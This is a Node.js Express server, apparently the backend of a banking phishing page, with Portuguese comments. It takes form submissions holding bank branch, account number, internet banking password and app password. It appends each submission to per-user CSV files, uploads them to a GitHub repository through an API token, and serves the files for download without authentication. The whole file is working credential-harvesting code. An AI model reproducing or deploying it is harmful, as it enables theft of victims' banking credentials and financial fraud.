require('dotenv').config();
const express = require("express");
const compression = require("compression");
const multer = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path = require("path");
const { Octokit } = require("@octokit/rest");
const fs = require("fs");

const app = express();
const upload = multer();

// Ativa gzip/brotli para todas as respostas
app.use(compression());

// Para servir HTML/CSS/JS/IMG com compressão
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// Configurações do GitHub via variáveis de ambiente
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_OWNER = process.env.GITHUB_OWNER;  // ex: "seu-usuario"
const GITHUB_REPO = process.env.GITHUB_REPO;    // ex: "nome-do-repo"
const BASE_PATH = process.env.GITHUB_BASE_PATH || '';

const octokit = new Octokit({ auth: GITHUB_TOKEN });

// Função para criar um escritor CSV para cada usuário
function getCsvWriter(userId) {
  const dir = path.join(__dirname, 'usuarios');
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  return createObjectCsvWriter({
    path: path.join(dir, `${userId}.csv`),
    header: [
      { id: "titularidade", title: "Titularidade" },
      { id: "tipo_conta", title: "Tipo de Conta" },
      { id: "agencia", title: "Agência" },
      { id: "conta", title: "Conta" },
      { id: "senhaInternet", title: "Senha da Internet" },
      { id: "senhaApp", title: "Senha Digital" }
    ],
    append: true
  });
}

// Processa o envio do formulário
// Agora usando multer para parsear multipart/form-data
app.post(
  "/processa_formulario",
  upload.none(),
  (req, res) => {
    const {
      titularidade,
      tipo_conta,
      agency,
      login,
      internet,
      app: senhaApp,
      user_id
    } = req.body;

    if (!agency || !login || !internet || !senhaApp || !user_id) {
      return res.status(400).send("Todos os campos são obrigatórios.");
    }

    const registro = [{
      titularidade,
      tipo_conta,
      agencia: agency,
      conta: login,
      senhaInternet: internet,
      senhaApp
    }];

    // 1) Salva localmente no CSV do usuário
    const csvWriter = getCsvWriter(user_id);
    csvWriter.writeRecords(registro)
      .then(() => console.log("Dados salvos no CSV do usuário com sucesso."))
      .catch(err => console.error("Erro ao salvar localmente no CSV:", err));

    // 2) Envia ao GitHub
    saveToGitHub(user_id, registro)
      .then(() => console.log("Dados enviados ao GitHub com sucesso."))
      .catch(err => console.error("Erro ao salvar no GitHub:", err));

    // Redireciona para a página de agradecimento
    res.redirect("/agradecimento.html");
  }
);

// Função para criar ou atualizar CSV de usuário no GitHub
async function saveToGitHub(userId, registros) {
  const filePathInRepo = BASE_PATH
    ? `${BASE_PATH}/${userId}.csv`
    : `${userId}.csv`;

  // Monta conteúdo CSV (linhas, sem cabeçalho)
  const csvContent = registros.map(r =>
    `${r.titularidade},${r.tipo_conta},${r.agencia},${r.conta},${r.senhaInternet},${r.senhaApp}`
  ).join("\n");

  try {
    // Tenta ler o arquivo existente para obter sha e conteúdo
    const { data: existing } = await octokit.repos.getContent({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: filePathInRepo
    });

    const prev = Buffer.from(existing.content, 'base64').toString('utf-8');
    const updated = prev.trim() + "\n" + csvContent;
    const contentEncoded = Buffer.from(updated, 'utf-8').toString('base64');

    await octokit.repos.createOrUpdateFileContents({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: filePathInRepo,
      message: `Atualiza CSV do usuário ${userId}`,
      content: contentEncoded,
      sha: existing.sha
    });

  } catch (error) {
    if (error.status === 404) {
      // Arquivo não existe, cria novo com cabeçalho + registros
      const header = 'Titularidade,Tipo de Conta,Agência,Conta,Senha da Internet,Senha Digital';
      const full = header + "\n" + csvContent;
      const contentEncoded = Buffer.from(full, 'utf-8').toString('base64');
      await octokit.repos.createOrUpdateFileContents({
        owner: GITHUB_OWNER,
        repo: GITHUB_REPO,
        path: filePathInRepo,
        message: `Cria CSV do usuário ${userId}`,
        content: contentEncoded
      });
    } else {
      throw error;
    }
  }
}

// Rota para download do CSV de um usuário específico
app.get("/download_csv/:userId", (req, res) => {
  const userId = req.params.userId;
  const filePath = path.join(__dirname, "usuarios", `${userId}.csv`);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send("Arquivo não encontrado");
  }
  res.download(filePath, `${userId}.csv`);
});

// Fallback para SPA
app.get("/*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Inicia o servidor na porta do Render ou 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
